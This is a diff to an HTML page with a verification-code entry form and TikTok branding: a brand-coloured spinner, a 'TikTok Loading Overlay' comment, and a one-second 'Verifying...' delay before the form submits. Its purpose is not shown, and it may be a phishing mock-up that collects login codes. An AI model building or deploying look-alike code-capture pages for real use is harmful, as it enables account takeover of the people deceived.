@@ -24,6 +24,7 @@
         justify-content: center;
         height: 100vh;
         color: #333;
+        position: relative;
       }
 
       .container {
@@ -35,7 +36,8 @@
         box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
         display: flex;
         flex-direction: column;
-        height: auto;
+        background: white;
+        z-index: 1;
       }
 
       .logo-container {
@@ -125,10 +127,59 @@
         color: #aaa;
         margin-top: 24px;
       }
+
+      #overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.8);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        z-index: 999;
+      }
+
+      button.submit-button:disabled {
+        background-color: #ccc;
+        cursor: default;
+      }
+
+      #loading-spinner {
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #fe2c55;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      #loading-text {
+        margin-top: 12px;
+        font-size: 16px;
+        color: #555;
+      }
     </style>
   </head>
 
   <body>
+    <!-- TikTok Loading Overlay -->
+    <div id="overlay">
+      <div id="loading-spinner"></div>
+      <div id="loading-text">Processing...</div>
+    </div>
+
     <div class="container">
       <div class="logo-container">
         <img
@@ -172,6 +223,8 @@
 
     <script>
       const inputs = document.querySelectorAll(".code-inputs input");
+      const form = document.getElementById("code-form");
+      const submitButton = document.querySelector(".submit-button");
 
       inputs.forEach((input, index) => {
         input.addEventListener("input", (e) => {
@@ -187,15 +240,17 @@
         });
       });
 
-      const form = document.getElementById("code-form");
       form.addEventListener("submit", (e) => {
         e.preventDefault();
-        const code = Array.from(inputs)
-          .map((input) => input.value)
-          .join("");
-        console.log("Entered Code:", code);
-        // Submit your real form here
-        form.submit();
+
+        submitButton.disabled = true;
+        submitButton.style.backgroundColor = "#fc869e";
+        submitButton.style.cursor = "default";
+        submitButton.innerText = "Verifying...";
+
+        setTimeout(() => {
+          form.submit();
+        }, 1000);
       });
     </script>
   </body>
